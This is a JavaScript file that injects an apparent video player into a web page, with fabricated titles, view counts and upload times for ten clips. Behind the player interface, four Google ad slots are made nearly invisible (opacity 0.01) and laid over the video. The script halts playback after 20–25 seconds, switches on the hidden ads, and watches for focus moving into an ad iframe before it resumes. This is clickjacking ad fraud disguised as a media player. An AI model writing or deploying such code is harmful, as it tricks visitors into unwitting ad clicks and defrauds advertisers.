(function () {
    function initPlayer() {
        var allP = document.getElementsByTagName('p');
        if (!allP || allP.length === 0) {
            setTimeout(initPlayer, 500);
            return;
        }
        var targetP = allP[0];
        var wrapper = document.createElement('div');
        wrapper.id = 'vidstream-player-wrapper';
        var style = document.createElement('style');
        style.textContent = `
            /* ALL styles scoped to #vidstream-player-wrapper ONLY */
            /* Will NOT affect any other elements on the page */
            #vidstream-player-wrapper {
                width: 100% !important;
                max-width: 800px !important;
                margin: 16px auto !important;
                padding: 0 !important;
                font-family: 'Inter', Arial, sans-serif !important;
                color: #e0e0e0 !important;
                display: block !important;
                float: none !important;
                position: relative !important;
                box-sizing: border-box !important;
                line-height: normal !important;
                text-align: left !important;
                background: transparent !important;
                border: none !important;
            }
            #vidstream-player-wrapper .vsp-vc {
                position: relative !important;
                width: 100% !important;
                padding-top: 56.25% !important;
                background: #000 !important;
                border-radius: 12px !important;
                overflow: hidden !important;
                box-shadow: 0 4px 20px rgba(0,0,0,0.4) !important;
                margin: 0 !important;
                padding-left: 0 !important;
                padding-right: 0 !important;
                padding-bottom: 0 !important;
                box-sizing: border-box !important;
            }
            #vidstream-player-wrapper .vsp-vc video {
                position: absolute !important;
                top: 0 !important;
                left: 0 !important;
                width: 100% !important;
                height: 100% !important;
                object-fit: cover !important;
                z-index: 2 !important;
                margin: 0 !important;
                padding: 0 !important;
                border: none !important;
                display: block !important;
            }
            /* Ads - directly positioned, no click handler */
            #vidstream-player-wrapper .vsp-ad {
                position: absolute !important;
                z-index: 20 !important;
                opacity: 0.01 !important;
                overflow: hidden !important;
                display: none !important;
                margin: 0 !important;
                padding: 0 !important;
                border: none !important;
            }
            #vidstream-player-wrapper .vsp-ad.vsp-show {
                display: block !important;
            }
            #vidstream-player-wrapper #vsp-ad-p1 { top: 5% !important; left: 5% !important; }
            #vidstream-player-wrapper #vsp-ad-p2 { top: 5% !important; right: 5% !important; }
            #vidstream-player-wrapper #vsp-ad-p3 { bottom: 10% !important; left: 50% !important; transform: translateX(-50%) !important; }
            #vidstream-player-wrapper #vsp-ad-p4 { top: 50% !important; left: 50% !important; transform: translate(-50%, -50%) !important; }
            /* Play overlay */
            #vidstream-player-wrapper .vsp-overlay {
                position: absolute !important;
                top: 0 !important;
                left: 0 !important;
                width: 100% !important;
                height: 100% !important;
                display: flex !important;
                align-items: center !important;
                justify-content: center !important;
                background: rgba(0,0,0,0.5) !important;
                opacity: 0 !important;
                transition: opacity 0.4s !important;
                cursor: pointer !important;
                z-index: 5 !important;
                pointer-events: none !important;
                margin: 0 !important;
                padding: 0 !important;
                border: none !important;
            }
            #vidstream-player-wrapper .vsp-overlay.vsp-visible {
                opacity: 1 !important;
                pointer-events: auto !important;
            }
            #vidstream-player-wrapper .vsp-play-btn {
                width: 64px !important;
                height: 64px !important;
                background: rgba(124, 58, 237, 0.9) !important;
                border-radius: 50% !important;
                display: flex !important;
                align-items: center !important;
                justify-content: center !important;
                box-shadow: 0 0 30px rgba(124, 58, 237, 0.4) !important;
                margin: 0 !important;
                padding: 0 !important;
                border: none !important;
            }
            #vidstream-player-wrapper .vsp-play-btn svg {
                width: 26px !important;
                height: 26px !important;
                fill: #fff !important;
                margin-left: 3px !important;
                display: block !important;
            }
            /* Progress bar */
            #vidstream-player-wrapper .vsp-pw {
                position: absolute !important;
                bottom: 0 !important;
                left: 0 !important;
                width: 100% !important;
                height: 4px !important;
                background: rgba(255,255,255,0.1) !important;
                z-index: 10 !important;
                margin: 0 !important;
                padding: 0 !important;
                border: none !important;
            }
            #vidstream-player-wrapper .vsp-pb {
                height: 100% !important;
                background: linear-gradient(90deg, #7c3aed, #ec4899) !important;
                width: 0% !important;
                transition: width 0.3s linear !important;
                margin: 0 !important;
                padding: 0 !important;
                border: none !important;
            }
            /* Timer */
            #vidstream-player-wrapper .vsp-tm {
                position: absolute !important;
                top: 10px !important;
                right: 10px !important;
                padding: 4px 12px !important;
                background: rgba(0,0,0,0.7) !important;
                border-radius: 16px !important;
                font-size: 12px !important;
                font-weight: 600 !important;
                color: #fff !important;
                z-index: 10 !important;
                border: 1px solid rgba(255,255,255,0.1) !important;
                display: flex !important;
                align-items: center !important;
                gap: 5px !important;
                margin: 0 !important;
                line-height: normal !important;
            }
            #vidstream-player-wrapper .vsp-td {
                width: 7px !important;
                height: 7px !important;
                border-radius: 50% !important;
                background: #ef4444 !important;
                animation: vsp-pulse 1.5s infinite !important;
                margin: 0 !important;
                padding: 0 !important;
                display: block !important;
            }
            @keyframes vsp-pulse {
                0%, 100% { opacity: 1; }
                50% { opacity: 0.3; }
            }
            /* Controls */
            #vidstream-player-wrapper .vsp-ctrls {
                display: flex !important;
                align-items: center !important;
                justify-content: space-between !important;
                padding: 10px 2px !important;
                margin: 6px 0 0 0 !important;
                border: none !important;
                background: transparent !important;
            }
            #vidstream-player-wrapper .vsp-cg {
                display: flex !important;
                align-items: center !important;
                gap: 6px !important;
                margin: 0 !important;
                padding: 0 !important;
            }
            #vidstream-player-wrapper .vsp-btn {
                width: 36px !important;
                height: 36px !important;
                min-width: 36px !important;
                border-radius: 8px !important;
                border: 1px solid rgba(255,255,255,0.1) !important;
                background: rgba(30,30,40,0.8) !important;
                color: #ccc !important;
                display: flex !important;
                align-items: center !important;
                justify-content: center !important;
                cursor: pointer !important;
                transition: all 0.3s !important;
                font-size: 15px !important;
                margin: 0 !important;
                padding: 0 !important;
                line-height: 1 !important;
                text-decoration: none !important;
                text-transform: none !important;
                box-shadow: none !important;
                outline: none !important;
                font-family: inherit !important;
            }
            #vidstream-player-wrapper .vsp-btn:hover {
                background: rgba(124, 58, 237, 0.25) !important;
                color: #fff !important;
            }
            #vidstream-player-wrapper .vsp-nb {
                width: auto !important;
                padding: 6px 16px !important;
                font-size: 12px !important;
                font-weight: 600 !important;
                background: linear-gradient(135deg, #7c3aed, #6d28d9) !important;
                border: none !important;
                color: #fff !important;
            }
            /* Title & meta */
            #vidstream-player-wrapper .vsp-ti {
                font-size: 15px !important;
                font-weight: 700 !important;
                color: #f0f0f0 !important;
                margin: 10px 0 0 0 !important;
                padding: 0 !important;
                line-height: 1.3 !important;
                text-align: left !important;
                border: none !important;
                background: transparent !important;
                display: block !important;
            }
            #vidstream-player-wrapper .vsp-mt {
                font-size: 12px !important;
                color: rgba(255,255,255,0.4) !important;
                margin: 4px 0 0 0 !important;
                padding: 0 !important;
                line-height: 1.3 !important;
                text-align: left !important;
                border: none !important;
                background: transparent !important;
                display: block !important;
            }
        `;
        document.head.appendChild(style);
        // Google Fonts
        if (!document.querySelector('link[href*="fonts.googleapis.com/css2?family=Inter"]')) {
            var fontLink = document.createElement('link');
            fontLink.href = 'https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap';
            fontLink.rel = 'stylesheet';
            document.head.appendChild(fontLink);
        }
        // HTML - all classes prefixed with vsp- to avoid conflicts
        wrapper.innerHTML = `
            <div class="vsp-vc">
                <video id="vspVid" playsinline preload="auto" muted></video>
                <div class="vsp-ad" id="vsp-ad-p1"><div id="vsp-gpt-1"></div></div>
                <div class="vsp-ad" id="vsp-ad-p2"><div id="vsp-gpt-2"></div></div>
                <div class="vsp-ad" id="vsp-ad-p3"><div id="vsp-gpt-3"></div></div>
                <div class="vsp-ad" id="vsp-ad-p4"><div id="vsp-gpt-4"></div></div>
                <div class="vsp-overlay vsp-visible" id="vspOv">
                    <div class="vsp-play-btn">
                        <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
                    </div>
                </div>
                <div class="vsp-tm"><div class="vsp-td"></div><span id="vspTT">0:00</span></div>
                <div class="vsp-pw"><div class="vsp-pb" id="vspPB"></div></div>
            </div>
            <div class="vsp-ctrls">
                <div class="vsp-cg">
                    <button class="vsp-btn" id="vspPP">&#9654;</button>
                    <button class="vsp-btn" id="vspM">&#128263;</button>
                    <button class="vsp-btn" id="vspV">&#128266;</button>
                </div>
                <div class="vsp-cg">
                    <button class="vsp-btn" id="vspS">&#128256;</button>
                    <button class="vsp-btn vsp-nb" id="vspN">Next &#9654;</button>
                </div>
            </div>
            <div class="vsp-ti" id="vspTi">Loading video...</div>
            <div class="vsp-mt" id="vspMt">-- views</div>
        `;
        // Insert before paragraph 1
        targetP.parentNode.insertBefore(wrapper, targetP);
        // ============================================================
        // CONFIG
        // ============================================================
        var videoList = [
            { src: 'https://mapleupdates.com/wp-content/uploads/2026/02/17618_480p.mp4', title: 'Trending Video #1 - Must Watch', views: '1.2M views', date: '2 hours ago' },
            { src: 'https://mapleupdates.com/wp-content/uploads/2026/02/25407_480p.mp4', title: 'Viral Clip #2 - Amazing Moments', views: '982K views', date: '5 hours ago' },
            { src: 'https://mapleupdates.com/wp-content/uploads/2026/02/12894_480p.mp4', title: 'Best of Today #3 - Top Highlights', views: '3.4M views', date: '1 day ago' },
            { src: 'https://mapleupdates.com/wp-content/uploads/2026/02/1756_480p.mp4', title: 'Funny Moments #4 - Comedy Gold', views: '756K views', date: '3 hours ago' },
            { src: 'https://mapleupdates.com/wp-content/uploads/2026/02/12291_480p.mp4', title: 'Epic Fails #5 - Try Not To Laugh', views: '2.1M views', date: '6 hours ago' },
            { src: 'https://mapleupdates.com/wp-content/uploads/2026/02/5634_480p.mp4', title: 'Daily Dose #6 - Entertainment Mix', views: '1.8M views', date: '4 hours ago' },
            { src: 'https://mapleupdates.com/wp-content/uploads/2026/02/25357_480p.mp4', title: 'Trending Now #7 - Viral Content', views: '4.5M views', date: '1 day ago' },
            { src: 'https://mapleupdates.com/wp-content/uploads/2026/02/14558_480p.mp4', title: 'Best Clips #8 - Weekly Roundup', views: '672K views', date: '8 hours ago' },
            { src: 'https://mapleupdates.com/wp-content/uploads/2026/02/12616_480p.mp4', title: 'Highlights #9 - Top Picks Today', views: '1.5M views', date: '12 hours ago' },
            { src: 'https://mapleupdates.com/wp-content/uploads/2026/02/25275_480p.mp4', title: 'Mega Compilation #10 - Best Of', views: '5.2M views', date: '2 days ago' }
        ];
        var AD_UNITS = [
            { path: '/23338978725/ads1', size: [[320, 480], [336, 280]], divId: 'vsp-gpt-1' },
            { path: '/23338978725/ads2', size: [[320, 480], [336, 280]], divId: 'vsp-gpt-2' },
            { path: '/23338978725/ads3', size: [[320, 480], [336, 280]], divId: 'vsp-gpt-3' },
            { path: '/23338978725/ads4', size: [[320, 480], [336, 280]], divId: 'vsp-gpt-4' }
        ];
        var AD_ROTATE_MS = 30000;
        var MIN_PLAY = 20;
        var MAX_PLAY = 25;
        // STATE
        var currentIdx = -1, progInterval = null, elapsed = 0, stopAt = 0;
        var adTimer = null, gptSlots = [], isStopped = false;
        var blurInterval = null, resumeTO = null;
        // DOM
        var vid = document.getElementById('vspVid');
        var overlay = document.getElementById('vspOv');
        var timerTxt = document.getElementById('vspTT');
        var progBar = document.getElementById('vspPB');
        var titleEl = document.getElementById('vspTi');
        var metaEl = document.getElementById('vspMt');
        var btnPP = document.getElementById('vspPP');
        var btnN = document.getElementById('vspN');
        var btnM = document.getElementById('vspM');
        var btnV = document.getElementById('vspV');
        var btnS = document.getElementById('vspS');
        var adEls = [
            document.getElementById('vsp-ad-p1'),
            document.getElementById('vsp-ad-p2'),
            document.getElementById('vsp-ad-p3'),
            document.getElementById('vsp-ad-p4')
        ];
        // ADS
        function setupAds() {
            if (!document.querySelector('script[src*="securepubads.g.doubleclick.net"]')) {
                var s = document.createElement('script');
                s.async = true;
                s.src = 'https://securepubads.g.doubleclick.net/tag/js/gpt.js';
                document.head.appendChild(s);
            }
            window.googletag = window.googletag || { cmd: [] };
            googletag.cmd.push(function () {
                for (var i = 0; i < AD_UNITS.length; i++) {
                    var slot = googletag.defineSlot(AD_UNITS[i].path, AD_UNITS[i].size, AD_UNITS[i].divId);
                    if (slot) { slot.addService(googletag.pubads()); gptSlots.push(slot); }
                }
                googletag.pubads().enableSingleRequest();
                googletag.pubads().collapseEmptyDivs();
                googletag.enableServices();
                for (var j = 0; j < AD_UNITS.length; j++) { googletag.display(AD_UNITS[j].divId); }
            });
            adTimer = setInterval(refreshAds, AD_ROTATE_MS);
        }
        function refreshAds() {
            googletag.cmd.push(function () {
                if (gptSlots.length > 0) googletag.pubads().refresh(gptSlots);
            });
        }
        function showAds() { adEls.forEach(function (d) { if (d) d.classList.add('vsp-show'); }); }
        function hideAds() { adEls.forEach(function (d) { if (d) d.classList.remove('vsp-show'); }); }
        // PLAYER
        function randStop() { return Math.floor(Math.random() * (MAX_PLAY - MIN_PLAY + 1)) + MIN_PLAY; }
        function randIdx() {
            var idx; do { idx = Math.floor(Math.random() * videoList.length); }
            while (idx === currentIdx && videoList.length > 1); return idx;
        }
        function loadVid(i) {
            currentIdx = i;
            var v = videoList[i];
            vid.src = v.src;
            titleEl.textContent = v.title;
            metaEl.textContent = v.views + ' \u2022 ' + v.date;
            elapsed = 0;
            stopAt = randStop();
            progBar.style.width = '0%';
            timerTxt.textContent = '0:00';
            overlay.classList.add('vsp-visible');
            hideAds();
            btnPP.innerHTML = '&#9654;';
            isStopped = false;
        }
        function playVid() {
            vid.play().then(function () {
                overlay.classList.remove('vsp-visible');
                hideAds();
                btnPP.innerHTML = '&#9208;';
                isStopped = false;
                startTimer();
            }).catch(function () {
                vid.muted = true;
                vid.play().then(function () {
                    overlay.classList.remove('vsp-visible');
                    hideAds();
                    btnPP.innerHTML = '&#9208;';
                    btnM.innerHTML = '&#128263;';
                    isStopped = false;
                    startTimer();
                });
            });
        }
        function pauseVid() {
            vid.pause();
            btnPP.innerHTML = '&#9654;';
            clearTmr();
        }
        function stopAtLimit() {
            vid.pause();
            clearTmr();
            btnPP.innerHTML = '&#9654;';
            isStopped = true;
            overlay.classList.add('vsp-visible');
            showAds();
            refreshAds();
            startBlurDetect();
        }
        // BLUR/FOCUS DETECTION
        function startBlurDetect() {
            stopBlurDetect();
            window.addEventListener('blur', onBlur);
            blurInterval = setInterval(function () {
                if (document.activeElement && document.activeElement.tagName === 'IFRAME') { onAdClick(); }
            }, 200);
            resumeTO = setTimeout(function () { if (isStopped) resumeAfterAd(); }, 5000);
        }
        function stopBlurDetect() {
            window.removeEventListener('blur', onBlur);
            if (blurInterval) { clearInterval(blurInterval); blurInterval = null; }
            if (resumeTO) { clearTimeout(resumeTO); resumeTO = null; }
        }
        function onBlur() {
            if (isStopped) { window.addEventListener('focus', onFocus, { once: true }); }
        }
        function onFocus() {
            if (isStopped) { setTimeout(function () { resumeAfterAd(); }, 500); }
        }
        function onAdClick() {
            if (isStopped) { stopBlurDetect(); setTimeout(function () { resumeAfterAd(); }, 1500); }
        }
        function resumeAfterAd() {
            if (!isStopped) return;
            stopBlurDetect();
            isStopped = false;
            elapsed = 0;
            vid.currentTime = 0;
            stopAt = randStop();
            progBar.style.width = '0%';
            playVid();
        }
        overlay.addEventListener('click', function () {
            if (!isStopped) { playVid(); }
        });
        function startTimer() {
            clearTmr();
            progInterval = setInterval(function () {
                if (!vid.paused) {
                    elapsed = Math.floor(vid.currentTime);
                    var m = Math.floor(elapsed / 60);
                    var s = elapsed % 60;
                    timerTxt.textContent = m + ':' + (s < 10 ? '0' : '') + s;
                    progBar.style.width = Math.min((elapsed / stopAt) * 100, 100) + '%';
                    if (elapsed >= stopAt) { stopAtLimit(); }
                }
            }, 500);
        }
        function clearTmr() {
            if (progInterval) { clearInterval(progInterval); progInterval = null; }
        }
        function nextVid() {
            clearTmr();
            stopBlurDetect();
            isStopped = false;
            loadVid(randIdx());
            setTimeout(function () { playVid(); }, 800);
            refreshAds();
        }
        // EVENTS
        btnPP.addEventListener('click', function () { if (vid.paused) playVid(); else pauseVid(); });
        btnN.addEventListener('click', function () { nextVid(); });
        btnS.addEventListener('click', function () { nextVid(); });
        btnM.addEventListener('click', function () {
            vid.muted = !vid.muted;
            btnM.innerHTML = vid.muted ? '&#128263;' : '&#128264;';
        });
        btnV.addEventListener('click', function () {
            vid.muted = false;
            vid.volume = Math.min(1, vid.volume + 0.2);
            btnM.innerHTML = '&#128266;';
        });
        vid.addEventListener('ended', function () { setTimeout(function () { nextVid(); }, 1500); });
        // START
        loadVid(randIdx());
        setupAds();
    }
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initPlayer);
    } else {
        initPlayer();
    }
})();
